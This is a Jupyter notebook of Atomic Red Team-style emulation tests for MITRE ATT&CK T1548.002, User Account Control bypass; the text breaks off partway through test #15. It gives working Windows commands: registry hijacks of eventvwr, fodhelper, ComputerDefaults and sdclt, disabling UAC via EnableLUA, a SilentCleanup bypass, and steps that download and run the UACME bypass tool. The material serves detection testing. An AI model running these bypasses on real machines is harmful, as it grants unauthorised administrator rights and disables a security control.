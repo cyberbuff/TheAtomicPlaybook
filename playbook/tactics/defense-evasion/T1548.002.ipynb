{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "87687d73",
   "metadata": {},
   "source": "# T1548.002 - Bypass User Account Control\nAdversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)"
  },
  {
   "cell_type": "markdown",
   "id": "5331243d",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "05ca305d",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Bypass UAC using Event Viewer (cmd)",
    "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges. \n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f\ncmd.exe /c eventvwr.msc\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b246070",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "ff3452a8",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg.exe delete hkcu\\software\\classes\\mscfile /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "047a7343",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "db9f3463",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Bypass UAC using Event Viewer (PowerShell)",
    "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "89c8bc6d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "88872a0c",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9ccbd0cc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "087bd42f",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Bypass UAC using Fodhelper",
    "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9583b30e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "5e239520",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d20c664c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "25acaef2",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Bypass UAC using Fodhelper - PowerShell",
    "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "82ff83f0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "1e8230c2",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1bada050",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "796f8c1e",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Bypass UAC using ComputerDefaults (PowerShell)",
    "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a7b33bd3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "a29958a8",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1c3bd8db",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "726b96d5",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Bypass UAC by Mocking Trusted Directories",
    "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nmkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"C:\\Windows\\System32\\cmd.exe\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "82039da2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "54803765",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nrd \"\\\\?\\C:\\Windows \\\" /S /Q >nul 2>nul\ndel \"c:\\testbypass.exe\" >nul 2>nul\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1a228fe8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1731b403",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Bypass UAC using sdclt DelegateExecute",
    "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\nStart-Sleep -s 3\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "936c6e49",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "6cbca8fe",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \"HKCU:\\Software\\Classes\\Folder\" -Recurse -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ae501073",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6a1477a7",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Disable UAC using reg.exe",
    "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "856c0919",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "d7220304",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b32c23eb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9d6a814d",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Bypass UAC using SilentCleanup task",
    "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\T1548.002\\src\\T1548.002.bat\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e9811af",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "a977afb9",
   "metadata": {},
   "source": "### Atomic Test #10 - UACME Bypass Method 23\nExecutes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n\n##### Check Prereq Commands:\n```cmd\n$tempPath = cmd /c echo PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\23 Akagi64.exe\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ae91a2cd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "5fb38076",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\23 Akagi64.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b48090c6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "56947102",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\npowershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e3319913",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "521daa52",
   "metadata": {},
   "source": "### Atomic Test #11 - UACME Bypass Method 31\nExecutes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n\n##### Check Prereq Commands:\n```cmd\n$tempPath = cmd /c echo PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\31 Akagi64.exe\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "80511768",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 11 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "cb302f44",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\31 Akagi64.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ff10bd66",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "55d139a5",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\npowershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "24885ee4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 11 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6e6749e2",
   "metadata": {},
   "source": "### Atomic Test #12 - UACME Bypass Method 33\nExecutes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n\n##### Check Prereq Commands:\n```cmd\n$tempPath = cmd /c echo PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\33 Akagi64.exe\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "89138ad7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 12 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "97c68f6b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\33 Akagi64.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "55e35aa1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "b89dda57",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\npowershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "465ec1f1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "18b24acb",
   "metadata": {},
   "source": "### Atomic Test #13 - UACME Bypass Method 34\nExecutes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n\n##### Check Prereq Commands:\n```cmd\n$tempPath = cmd /c echo PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\34 Akagi64.exe\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a55e559b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 13 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "dd0b164e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\34 Akagi64.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7d8e81de",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "d5937b9a",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\npowershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5b337d58",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 13 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c9b8c881",
   "metadata": {},
   "source": "### Atomic Test #14 - UACME Bypass Method 39\nExecutes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n\n##### Check Prereq Commands:\n```cmd\n$tempPath = cmd /c echo PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\39 Akagi64.exe\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e7590845",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 14 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "692ce4dc",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\39 Akagi64.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f764e9c2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "57a95a5f",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\npowershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd7e8e52",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 14 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6a7b6894",
   "metadata": {},
   "source": "### Atomic Test #15 - UACME Bypass Method 56\nExecutes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n\n##### Check Prereq Commands:\n```cmd\n$tempPath = cmd /c echo PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\56 Akagi64.exe\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b592c813",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1548.002 -TestNumbers 15 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1ffab067",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
